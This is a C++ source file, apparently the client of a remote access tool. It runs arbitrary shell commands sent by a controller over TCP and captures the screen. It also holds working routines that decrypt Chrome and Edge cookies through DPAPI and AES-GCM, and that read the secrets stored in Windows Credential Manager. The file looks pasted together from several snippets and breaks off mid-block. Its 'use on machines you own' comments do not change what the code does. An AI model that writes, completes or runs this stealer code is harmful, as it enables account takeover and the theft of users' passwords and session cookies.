           #include "wrappers.h"
#include "sockets.h"
#include <iostream>
#include <array>
#include <cstdio>
#include <string>
#include <vector>
#include <sstream>
#include <cstring>
#include "json.hpp"
using json = nlohmann::json;

#include <filesystem>
namespace fs = std::filesystem;

#include <fstream>
#include "file_transfer.h"
#include "file_manager.h"
#include "process_manager.h"
#include "system_info.h"
// #include "chat.h"
#include "power_control.h"
#include "clipboard.h"


#include "recording.h"
#include "help.h"
#include "security.h"
#include <atomic>
#include <cstdlib>
#include "base64.h"
#include <thread>
#include "utils.h"
#include "handle_security.h"
#include "handle_file_transfer.h"

// --- Platform-specific includes ---
#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>


#include <wincrypt.h>

#include <tlhelp32.h>
#include <tchar.h>
#include <lm.h> 
#include <wtsapi32.h>
#include <powrprof.h>   // SetSuspendState
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wtsapi32.lib")
#else
#include <cstdio>
#include <jpeglib.h>
#include <setjmp.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <pwd.h>
#include <signal.h>
#include <unistd.h>
#endif

            // --- Global client/session IDs ---

            static std::string SESSION_ID;

            std::atomic<bool> recording_active(false);
            std::thread recording_thread;


        

#ifdef __linux__
// --- Capture screen + encode to JPEG on Linux ---
std::vector<unsigned char> capture_screen_jpeg(int quality = 75) {
    std::vector<unsigned char> jpeg_data;

    Display* display = XOpenDisplay(nullptr);
    if (!display) return jpeg_data;

    Window root = DefaultRootWindow(display);
    XWindowAttributes gwa;
    XGetWindowAttributes(display, root, &gwa);

    XImage* img = XGetImage(display, root, 0, 0, gwa.width, gwa.height, AllPlanes, ZPixmap);
    if (!img) {
        XCloseDisplay(display);
        return jpeg_data;
    }

    // libjpeg setup
    jpeg_compress_struct cinfo;
    jpeg_error_mgr jerr;
    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);

    unsigned char* outbuffer = nullptr;
    unsigned long outsize = 0;
    jpeg_mem_dest(&cinfo, &outbuffer, &outsize);

    cinfo.image_width = img->width;
    cinfo.image_height = img->height;
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;

    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, quality, TRUE);
    jpeg_start_compress(&cinfo, TRUE);

    JSAMPROW row_pointer[1];
    std::vector<unsigned char> row(img->width * 3);

    for (int y = 0; y < img->height; y++) {
        for (int x = 0; x < img->width; x++) {
            unsigned long pixel = XGetPixel(img, x, y);
            row[x * 3 + 0] = (pixel & img->red_mask) >> 16;
            row[x * 3 + 1] = (pixel & img->green_mask) >> 8;
            row[x * 3 + 2] = (pixel & img->blue_mask);
        }
        row_pointer[0] = row.data();
        jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }

    jpeg_finish_compress(&cinfo);
    jpeg_data.assign(outbuffer, outbuffer + outsize);
    jpeg_destroy_compress(&cinfo);
    free(outbuffer);

    XDestroyImage(img);
    XCloseDisplay(display);

    return jpeg_data;
}
#endif // __linux__


// cookie_dump.cpp
// Reads Chrome/Edge cookies on Windows, decrypts them, writes cookies.csv
// Dependencies: sqlite3, nlohmann/json (single header), Crypt32.lib, Bcrypt.lib

#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <sstream>
#include <algorithm>

#include "sqlite3.h"
#include "json.hpp" // nlohmann::json single header

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

static std::string getenv_str(const char* k) {
    const char* v = std::getenv(k);
    return v ? std::string(v) : std::string{};
}


static std::vector<BYTE> dpapi_unprotect(const std::vector<BYTE>& data) {
    DATA_BLOB in, out;
    in.pbData = (BYTE*)data.data();
    in.cbData = (DWORD)data.size();
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::vector<BYTE> res(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return res;
    }
    return {};
}

static bool base64_to_bytes(const std::string& b64, std::vector<BYTE>& out) {
    DWORD needed = 0;
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &needed, NULL, NULL)) return false;
    out.resize(needed);
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &needed, NULL, NULL)) return false;
    return true;
}

static std::string aes_gcm_decrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& encrypted) {
    // Chrome encrypted_value layout: "v10" or "v11" prefix then 12-byte IV then ciphertext+tag (tag is last 16 bytes)
    if (encrypted.size() >= 3 && encrypted[0] == 'v' && (encrypted[1] == '1')) {
        if (encrypted.size() < 3 + 12 + 16) return ""; // too small
        const BYTE* iv = encrypted.data() + 3;
        size_t ivLen = 12;
        const BYTE* cipherAndTag = encrypted.data() + 3 + ivLen;
        size_t catLen = encrypted.size() - 3 - ivLen;
        if (catLen < 16) return "";
        size_t tagLen = 16;
        size_t cipherLen = catLen - tagLen;
        const BYTE* cipher = cipherAndTag;
        const BYTE* tag = cipherAndTag + cipherLen;

        BCRYPT_ALG_HANDLE hAlg = NULL;
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return "";
        // set chaining mode to GCM
        // Set chaining mode to GCM (use wide string explicitly)
        const wchar_t* mode = BCRYPT_CHAIN_MODE_GCM; // L"GCM"
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)mode,
                  (ULONG)((wcslen(mode) + 1) * sizeof(wchar_t)), 0);


        DWORD objLen = 0, res = 0;
        if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&objLen, sizeof(objLen), &res, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }
        std::vector<BYTE> keyObj(objLen);

        BCRYPT_KEY_HANDLE hKey = NULL;
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), (ULONG)keyObj.size(), (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        // prepare auth info
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)iv;
        authInfo.cbNonce = (ULONG)ivLen;
        authInfo.pbTag = (PUCHAR)tag;
        authInfo.cbTag = (ULONG)tagLen;
        authInfo.pbAuthData = NULL;
        authInfo.cbAuthData = 0;

        std::vector<BYTE> plain(cipherLen);
        NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)cipher, (ULONG)cipherLen,
                                        &authInfo, NULL, 0,
                                        plain.data(), (ULONG)plain.size(), (ULONG*)&res, 0);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        if (status != 0) return "";
        return std::string((char*)plain.data(), res);
    }
    return "";
}

static std::string decrypt_cookie_value(const std::vector<BYTE>& masterKey, const std::vector<BYTE>& encrypted) {
    // If starts with v10/v11 -> AES-GCM with master key
    if (encrypted.size() >= 3 && encrypted[0] == 'v' && encrypted[1] == '1') {
        std::string dec = aes_gcm_decrypt(masterKey, encrypted);
        return dec;
    } else {
        // older: value encrypted directly with DPAPI
        auto plain = dpapi_unprotect(encrypted);
        if (!plain.empty()) return std::string((char*)plain.data(), plain.size());
    }
    return "";
}

std::string browser_credentials_report() {
      std::string localApp = getenv_str("LOCALAPPDATA");
    if (localApp.empty()) {
        std::cerr << "LOCALAPPDATA not found\n";
        return "LOCALAPPDATA not found";
    }

    // Desktop (Win32) Chrome & Edge paths
    std::vector<std::pair<std::string, std::string>> candidates = {
        { localApp + "\\Google\\Chrome\\User Data\\Local State", localApp + "\\Google\\Chrome\\User Data\\Default\\Cookies" },
        { localApp + "\\Microsoft\\Edge\\User Data\\Local State", localApp + "\\Microsoft\\Edge\\User Data\\Default\\Cookies" }
    };

    // Check for desktop Chrome/Edge first
    std::string localStatePath, cookiesPath;
    for (auto &p : candidates) {
        if (fs::exists(p.first) && fs::exists(p.second)) {
            localStatePath = p.first;
            cookiesPath = p.second;
            break;
        }
    }

    // If not found, try scanning for UWP Edge packages (wildcard)
    if (localStatePath.empty()) {
        std::string packagesPath = localApp + "\\Packages";
        bool uwpDetected = false;
        std::string uwpEdgePath;

        if (fs::exists(packagesPath)) {
            for (auto &entry : fs::directory_iterator(packagesPath)) {
                std::string name = entry.path().filename().string();
                if (name.find("Microsoft.MicrosoftEdge") != std::string::npos &&
                    fs::is_directory(entry.path())) {
                    uwpDetected = true;
                    uwpEdgePath = entry.path().string();
                    break;
                }
            }
        }

        if (uwpDetected) {
            std::cerr << "[INFO] Detected Microsoft Edge (UWP) package:\n"
                      << "       " << uwpEdgePath << "\n"
                      << "       ⚠️ UWP Edge runs in a sandbox, and its cookie/Local State files are not accessible "
                      << "to user-space programs.\n"
                      << "       Please install the desktop (Win32) Edge or Chrome for full access.\n";
            return "Detected UWP Edge (sandboxed, inaccessible cookies)";
        }

        std::cerr << "Couldn't find Chrome or Edge Local State and Cookies DB.\n"
                  << "Make sure desktop Chrome/Edge is installed for your user.\n";
        return "Couldn't find Chrome or Edge Local State and Cookies DB.";
    }

    std::cout << "✅ Found browser data:\n"
              << "Local State: " << localStatePath << "\n"
              << "Cookies DB: " << cookiesPath << "\n";
    // ... rest of your code unchanged ...

    // read Local State (JSON)
    std::ifstream ls(localStatePath, std::ios::binary);
    if (!ls) { std::cerr << "Failed to open Local State\n"; return "Failed to open Local State"; }
    std::string lscontent((std::istreambuf_iterator<char>(ls)), std::istreambuf_iterator<char>());

    json j;
    
        j = json::parse(lscontent);
    

    std::string encKeyB64;
    
        encKeyB64 = j.at("os_crypt").at("encrypted_key").get<std::string>();
    

    std::vector<BYTE> keyBlob;
    if (!base64_to_bytes(encKeyB64, keyBlob)) { std::cerr << "Base64 decode failed\n"; return "Base64 decode failed"; }
    // remove "DPAPI" prefix (first 5 bytes)
    if (keyBlob.size() <= 5) { std::cerr << "Encrypted key too small\n"; return "Encrypted key too small"; }
    std::vector<BYTE> keyEnc(keyBlob.begin() + 5, keyBlob.end());
    std::vector<BYTE> masterKey = dpapi_unprotect(keyEnc);
    if (masterKey.empty()) { std::cerr << "DPAPI unprotect failed for master key\n"; return "DPAPI unprotect failed for master key"; }

    // copy cookies DB to temp file (so we can read while Chrome open)
    fs::path tmp = fs::temp_directory_path() / ("Cookies_copy_" + std::to_string(GetCurrentProcessId()) + ".db");
    
        fs::copy_file(cookiesPath, tmp, fs::copy_options::overwrite_existing);
   

    // open sqlite
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tmp.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        std::cerr << "Failed to open copied Cookies DB\n"; sqlite3_close(db); return "Failed to open copied Cookies DB";
    }

    const char* sql = "SELECT host_key, name, path, expires_utc, encrypted_value FROM cookies;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        std::cerr << "Failed to prepare SQL\n"; sqlite3_close(db); return "Failed to prepare SQL";
    }

    std::ofstream out("cookies.csv", std::ios::binary);
    out << "host,name,path,expires_utc,value\n";

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* host = sqlite3_column_text(stmt, 0);
        const unsigned char* name = sqlite3_column_text(stmt, 1);
        const unsigned char* pathc = sqlite3_column_text(stmt, 2);
        long long expires = sqlite3_column_int64(stmt, 3);
        const void* blob = sqlite3_column_blob(stmt, 4);
        int blob_len = sqlite3_column_bytes(stmt, 4);

        std::string host_s = host ? (const char*)host : "";
        std::string name_s = name ? (const char*)name : "";
        std::string path_s = pathc ? (const char*)pathc : "";
        std::vector<BYTE> enc;
        if (blob && blob_len > 0) enc.assign((BYTE*)blob, (BYTE*)blob + blob_len);

        std::string value = decrypt_cookie_value(masterKey, enc);

        // Escape CSV fields simple way: double quotes and wrap if contains comma or quote or newline
        auto escape = [](const std::string &s)->std::string {
            bool need = s.find_first_of(",\"\n\r") != std::string::npos;
            std::string t = s;
            size_t pos = 0;
            while ((pos = t.find('"', pos)) != std::string::npos) { t.replace(pos,1,"\"\""); pos += 2; }
            if (need) return std::string("\"") + t + "\"";
            return t;
        };

        out << escape(host_s) << "," << escape(name_s) << "," << escape(path_s) << "," << expires << "," << escape(value) << "\n";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // remove temp copy
    fs::remove(tmp); 

    std::cout << "Wrote cookies.csv in current directory.\n";
    return "Wrote cookies.csv in current directory.";
}



void send_result_safe(sock_t sock, const json& payload, const std::string& client, const std::vector<BYTE>& frameData) {
    if (sock == SOCKET_ERR)
        return;

    std::string cmd = payload.value("cmd", "");
    std::string type = payload.value("type", "json");  // default to json
    bool hasFrame = !frameData.empty();

    json header = {
        {"client", client},
        {"cmd", cmd},
        {"type", hasFrame ? "binary_frame" : type},
        {"width", payload.value("width", 0)},
        {"height", payload.value("height", 0)},
        {"size", frameData.size()}
    };

    std::string header_str = header.dump();
    uint32_t header_len = htonl(static_cast<uint32_t>(header_str.size()));

    printf("Prepared header for client %s: %s\n", client.c_str(), header_str.c_str());

    // ✅ Send only header length + header
    send_all(sock, reinterpret_cast<const char*>(&header_len), sizeof(header_len));
    send_all(sock, header_str.c_str(), header_str.size());

    if (hasFrame) {
        // ❌ Don't send the extra 4-byte prefix (frame_len)
        // ✅ Send only the raw frame bytes
        send_all(sock, reinterpret_cast<const char*>(frameData.data()), frameData.size());
        printf("[TCP] Sent binary frame to %s (%zu bytes)\n", client.c_str(), frameData.size());
    } else {
        printf("[TCP] Sent JSON message to %s\n", client.c_str());
    }
}

       

            // --- Universal send wrapper ---
void send_result(sock_t sock, const json& payload, const std::string& client, const std::string& data, bool is_binary) {
    if (sock == SOCKET_ERR)
        return;

    std::string result = data;
    printf("Received into send_result: %zu bytes\n", result.size());
    std::string cmd = payload.value("cmd", "");

    if (is_binary) {
        result = base64_encode(reinterpret_cast<const unsigned char*>(data.data()), data.size());
        printf("is binary and further encoded: %zu bytes\n", result.size());
        // Never print the base64 string — it can contain characters that break the console
        printf("Binary data encoded: %zu bytes -> %zu base64 chars\n", data.size(), result.size());
        printf("Binary data encoded: %zu bytes -> %zu base64 chars\n", data.size(), result.c_str());
    }

    json msg = {
        {"client", client},
        {"cmd", cmd},
        {"result", result}
    };

    std::string out = msg.dump();
    uint32_t len_net = htonl(out.size());

    send_all(sock, reinterpret_cast<const char*>(&len_net), sizeof(len_net));
    send_all(sock, out.c_str(), out.size());

    printf("Sent %s total to client\n", out.c_str());

}


// --- Command implementations ---
std::string exec_command(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
#ifdef _WIN32
    FILE* pipe = _popen(cmd.c_str(), "r");
#else
    FILE* pipe = popen(cmd.c_str(), "r");
#endif
    if (!pipe) return "Failed to run command\n";
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
        result += buffer.data();
#ifdef _WIN32
    _pclose(pipe);
#else
    pclose(pipe);
#endif
    return result.empty() ? "No output\n" : result;
}

// Example: client_file_ops.cpp
// credentials_fetch.cpp
// Cross-platform credential fetcher (Windows and macOS).
// WARNING: returns secret values. Use only on machines you own.

// chromium_cookies_windows.cpp
// Build: link Advapi32.lib bcrypt.lib sqlite3.lib
// Purpose: extract and decrypt Chromium (Chrome/Edge) cookies for current user
// WARNING: secrets extracted. Run only on machines you own, as the same interactive user.


#include <bcrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <algorithm>
#include <cassert>
#include "sqlite3.h"


extern "C" {
#include "sqlite3.h"
}



#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Bcrypt.lib")

// helper: base64 decode (simple)
static std::string base64_decode(const std::string &in);

// helper: read file into string
static bool read_file(const std::string &path, std::string &out);

// helper: get Chrome/Edge Local State path (Default profile)
static std::string local_state_path() {
    const char* localAppData = std::getenv("LOCALAPPDATA");
    if (!localAppData) return {};
    return std::string(localAppData) +
           "\\Google\\Chrome\\User Data\\Local State";
}


// If using Edge change path to Microsoft\\Edge\\User Data\\Local State
// or pass as parameter to functions for other browsers.

// Parse JSON "encrypted_key" from Local State (very light-weight parse)
static bool get_encrypted_key_from_local_state(const std::string &local_state, std::string &out_b64) {
    // naive search for "encrypted_key"
    std::string needle = "\"encrypted_key\"";
    size_t pos = local_state.find(needle);
    if (pos == std::string::npos) return false;
    size_t colon = local_state.find(':', pos);
    if (colon == std::string::npos) return false;
    size_t quote = local_state.find('"', colon);
    if (quote == std::string::npos) return false;
    size_t quote2 = local_state.find('"', quote + 1);
    if (quote2 == std::string::npos) return false;
    out_b64 = local_state.substr(quote + 1, quote2 - (quote + 1));
    return true;
}

// Use CryptUnprotectData to decrypt DPAPI-encrypted master key
static bool dpapi_unprotect(const std::vector<BYTE> &enc, std::vector<BYTE> &out) {
    DATA_BLOB in;
    in.pbData = const_cast<BYTE*>(enc.data());
    in.cbData = (DWORD)enc.size();
    DATA_BLOB outBlob;
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) return false;
    out.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return true;
}

// AES-GCM decrypt using BCrypt (key must be raw bytes)
static bool aes_gcm_decrypt(const std::vector<BYTE> &key,
                            const std::vector<BYTE> &ciphertext,
                            std::vector<BYTE> &plaintext)
{
    // Chromium uses: encrypted_value = "v10" + 12-byte IV + ciphertext + 16-byte tag
    // So caller should pass ciphertext that excludes "v10".
    if (ciphertext.size() < 12 + 16) return false;
    const BYTE* iv = ciphertext.data();
    size_t iv_len = 12;
    const BYTE* ct = ciphertext.data() + iv_len;
    size_t ct_len = ciphertext.size() - iv_len - 16;
    const BYTE* tag = ciphertext.data() + iv_len + ct_len;
    ULONG result = 0;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Build auth info struct
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv;
    authInfo.cbNonce = (ULONG)iv_len;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;
    authInfo.pbAuthData = nullptr;
    authInfo.cbAuthData = 0;

    plaintext.resize(ct_len);
    NTSTATUS st = BCryptDecrypt(hKey,
                                (PUCHAR)ct, (ULONG)ct_len,
                                &authInfo,
                                NULL, 0,
                                plaintext.data(), (ULONG)ct_len,
                                &result,
                                0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return (st == 0);
}

// Helper: parse Chrome cookie encrypted_value and produce plaintext
static bool decrypt_chromium_encrypted_value(const std::vector<BYTE> &master_key,
                                             const std::vector<BYTE> &enc_blob,
                                             std::string &out_plain)
{
    // If starts with "v10" or "v11" -> AES-GCM with nonce at offset 3
    if (enc_blob.size() > 3 && std::string((char*)enc_blob.data(), 3) == "v10") {
        // strip prefix
        std::vector<BYTE> payload(enc_blob.begin() + 3, enc_blob.end());
        std::vector<BYTE> pt;
        if (!aes_gcm_decrypt(master_key, payload, pt)) return false;
        out_plain.assign((char*)pt.data(), pt.size());
        return true;
    }

    // Fallback: older DPAPI-encrypted blob: call CryptUnprotectData directly
    DATA_BLOB in{ (DWORD)enc_blob.size(), const_cast<BYTE*>(enc_blob.data()) };
    DATA_BLOB outBlob;
    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        out_plain.assign((char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData);
        return true;
    }
    return false;
}

// Step: get master key bytes from Local State
static bool get_chrome_master_key(std::vector<BYTE> &master_key) {
    std::string path = local_state_path();
    std::string local_state;
    if (!read_file(path, local_state)) {
    const char* localAppData = std::getenv("LOCALAPPDATA");
    if (!localAppData) return false;

    std::string edgepath = std::string(localAppData) +
        "\\Microsoft\\Edge\\User Data\\Local State";

    if (!read_file(edgepath, local_state)) return false;
}

    std::string b64;
    if (!get_encrypted_key_from_local_state(local_state, b64)) return false;
    // base64 decode
    std::string decoded = base64_decode(b64);
    if (decoded.size() <= 5) return false;
    // Chrome stores "DPAPI" prefix; strip it if present
    const std::string dpapi_prefix = "DPAPI";
    std::vector<BYTE> encKey;
    if (decoded.size() > dpapi_prefix.size() && decoded.compare(0, dpapi_prefix.size(), dpapi_prefix) == 0) {
        encKey.assign((BYTE*)decoded.data() + dpapi_prefix.size(), (BYTE*)decoded.data() + decoded.size());
    } else {
        encKey.assign((BYTE*)decoded.data(), (BYTE*)decoded.data() + decoded.size());
    }
    // DPAPI unprotect
    if (!dpapi_unprotect(encKey, master_key)) return false;
    return true;
}

// Utility: copy file (to avoid DB lock)
static bool copy_file_local(const std::string &src, const std::string &dst) {
    std::ifstream in(src, std::ios::binary);
    if (!in) return false;
    std::ofstream out(dst, std::ios::binary);
    if (!out) return false;
    out << in.rdbuf();
    return true;
}

// Very small base64 decoder (no external deps)
static const std::string b64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";
static inline bool is_b64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}
static std::string base64_decode(const std::string &in) {
    std::string out;
    int in_len = (int)in.size();
    int i = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    while (in_len-- && (in[in_] != '=') && is_b64(in[in_])) {
        char_array_4[i++] = in[in_]; in_++;
        if (i ==4) {
            for (i = 0; i <4; i++) char_array_4[i] = (unsigned char) b64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++) out.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (int j = i; j <4; j++) char_array_4[j] = 0;
        for (int j = 0; j <4; j++) char_array_4[j] = (unsigned char) b64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (int j = 0; (j < i - 1); j++) out.push_back(char_array_3[j]);
    }
    return out;
}

// Read a small file into string
static bool read_file(const std::string &path, std::string &out) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return false;
    std::ostringstream ss;
    ss << f.rdbuf();
    out = ss.str();
    return true;
}

// Main extraction routine
static std::string extract_chromium_cookies_for_profile(const std::string &cookies_path) {
    std::ostringstream out;
    out << "Cookies DB: " << cookies_path << "\n";

    // Get master key
    std::vector<BYTE> master_key;
    if (!get_chrome_master_key(master_key)) {
        out << "Unable to obtain Chromium master key (Local State). Falling back to DPAPI per-cookie if possible.\n";
    } else {
        out << "Master key retrieved (" << master_key.size() << " bytes).\n";
    }

    // Copy DB to temp
    char tmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    std::string tmpDb = std::string(tmpPath) + "Cookies_copy.db";
    if (!copy_file_local(cookies_path, tmpDb)) {
        out << "Failed to copy Cookies DB; ensure path correct and file accessible.\n";
        return out.str();
    }

    sqlite3 *db = nullptr;
    if (sqlite3_open_v2(tmpDb.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        out << "Failed to open sqlite DB: " << sqlite3_errmsg(db) << "\n";
        if (db) sqlite3_close(db);
        return out.str();
    }

    const char *sql = "SELECT host_key, name, encrypted_value FROM cookies";
    sqlite3_stmt *stmt = nullptr;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        out << "Failed to prepare query: " << sqlite3_errmsg(db) << "\n";
        sqlite3_close(db);
        return out.str();
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char *host = sqlite3_column_text(stmt, 0);
        const unsigned char *name = sqlite3_column_text(stmt, 1);
        const void *blob = sqlite3_column_blob(stmt, 2);
        int blob_len = sqlite3_column_bytes(stmt, 2);

        std::string host_s = host ? (const char*)host : "";
        std::string name_s = name ? (const char*)name : "";
        std::vector<BYTE> enc((BYTE*)blob, (BYTE*)blob + blob_len);

        out << "Host: " << host_s << "   Name: " << name_s << "\n";

        std::string plain;
        if (!master_key.empty()) {
            if (decrypt_chromium_encrypted_value(master_key, enc, plain)) {
                out << "  Value: " << plain << "\n\n";
                continue;
            }
        }
        // fallback try DPAPI
        std::string fallback;
        DATA_BLOB in{ (DWORD)enc.size(), const_cast<BYTE*>(enc.data()) };
        DATA_BLOB outBlob;
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
            fallback.assign((char*)outBlob.pbData, outBlob.cbData);
            LocalFree(outBlob.pbData);
            out << "  Value (DPAPI): " << fallback << "\n\n";
        } else {
            out << "  Value: (unable to decrypt)\n\n";
        }
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // remove temp DB
    DeleteFileA(tmpDb.c_str());

    return out.str();
}




#include <string>
#include <sstream>
#include <vector>
#include <iostream>

#if defined(_WIN32) || defined(_WIN64)
  #include <windows.h>
  #include <wincred.h>
  #include <shellapi.h>
  #pragma comment(lib, "Advapi32.lib")
#else
  #include <CoreFoundation/CoreFoundation.h>
  #include <Security/Security.h>
  #include <unistd.h>
  #include <sys/wait.h>
#endif

static std::string wstr_to_utf8(const std::wstring &w) {
    if (w.empty()) return {};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &w[0], (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &w[0], (int)w.size(), &s[0], size_needed, nullptr, nullptr);
    return s;
}

#if defined(_WIN32) || defined(_WIN64)

// Convert a binary credential blob (may be UTF-16 or bytes) to string
static std::string credential_blob_to_string(const CREDENTIALW* cred) {
    if (!cred || cred->CredentialBlobSize == 0 || cred->CredentialBlob == nullptr)
        return std::string();

    // Many Windows credentials are stored as UTF-16LE (wchar_t) or as raw bytes.
    // We'll try to interpret as UTF-16, falling back to raw bytes.
    const BYTE* blob = cred->CredentialBlob;
    DWORD size = cred->CredentialBlobSize;

    // If size even and looks like UTF-16 (heuristic: presence of many zero high-bytes)
    bool looks_like_utf16 = false;
    if (size >= 2 && (size % 2 == 0)) {
        int zero_count = 0;
        int checks = std::min((DWORD)16, size / 2);
        for (int i = 0; i < checks; ++i) {
            if (blob[i*2 + 1] == 0) ++zero_count;
        }
        looks_like_utf16 = (zero_count >= checks/2);
    }

    if (looks_like_utf16) {
        // Interpret as UTF-16LE and convert to UTF-8
        std::wstring w(reinterpret_cast<const wchar_t*>(blob), size / sizeof(wchar_t));
        return wstr_to_utf8(w);
    } else {
        // Fallback: treat as bytes and return hex or ascii
        std::string s;
        s.reserve(size);
        for (DWORD i = 0; i < size; ++i) {
            char c = static_cast<char>(blob[i]);
            if (c == '\0') break;
            s.push_back(c);
        }
        if (s.empty()) {
            // return hex if non-printable
            std::ostringstream oss;
            oss << std::hex;
            for (DWORD i = 0; i < size; ++i) {
                oss << std::setw(2) << std::setfill('0') << (int)blob[i];
            }
            return oss.str();
        }
        return s;
    }
}



static std::string fetch_windows_credential_manager() {
    std::ostringstream out;
    out << "=== Windows Credential Manager (current user only) ===\n\n";

    PCREDENTIALW *creds = nullptr;
    DWORD count = 0;

    // Use L"*" to enumerate only credentials accessible to the current user
    if (!CredEnumerateW(L"*", 0, &count, &creds)) {
        DWORD err = GetLastError();
        out << "CredEnumerateW failed. GetLastError=" << err << "\n";
        return out.str();
    }

    out << "Found " << count << " entries accessible to current user.\n\n";

    for (DWORD i = 0; i < count; ++i) {
        PCREDENTIALW c = creds[i];

        // Skip credentials the user cannot decrypt
        if (!c->UserName) continue;

        std::string target = c->TargetName ? wstr_to_utf8(c->TargetName) : "(null)";
        std::string user   = c->UserName ? wstr_to_utf8(c->UserName) : "(null)";

        out << "Entry " << (i + 1) << ":\n";
        out << "  TargetName: " << target << "\n";
        out << "  UserName  : " << user << "\n";
        out << "  Type      : " << c->Type << "\n";

        PCREDENTIALW cred = nullptr;
        if (CredReadW(c->TargetName, c->Type, 0, &cred)) {
            std::string secret = credential_blob_to_string(cred);
            out << "  Secret    : " << (secret.empty() ? "(empty or binary)" : secret) << "\n";
            CredFree(cred);
        } else {
            // Skip inaccessible secrets silently (no prompt)
            out << "  Secret    : (not accessible to current user)\n";
        }
        out << "\n";
    }

    CredFree(creds);
    return out.str();
}


#if defined(_WIN32) || defined(_WIN64)
#include <regex>

